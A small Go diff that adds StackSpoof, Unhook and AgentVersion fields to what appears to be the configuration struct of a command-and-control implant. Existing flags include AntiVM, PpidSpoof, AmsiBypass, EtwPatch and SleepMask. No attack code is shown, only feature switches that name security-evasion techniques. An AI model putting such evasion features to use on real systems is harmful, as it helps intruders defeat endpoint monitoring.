@@ -6,6 +6,8 @@ type Config struct {
 	DefaultURL      string
 	DefaultProfile  string
 	ServerPubKeyPem string
+	AgentVersion    string
+	StackSpoof      bool
 	ClientCertPem   string
 	ClientKeyPem    string
 	RootCAPem       string
@@ -76,6 +78,7 @@ type Config struct {
 	AntiVM            bool
 	PpidSpoof         bool
 	AmsiBypass        bool
+	Unhook            bool
 	EtwPatch          bool
 	SleepMask         bool
 	StringObfuscation bool
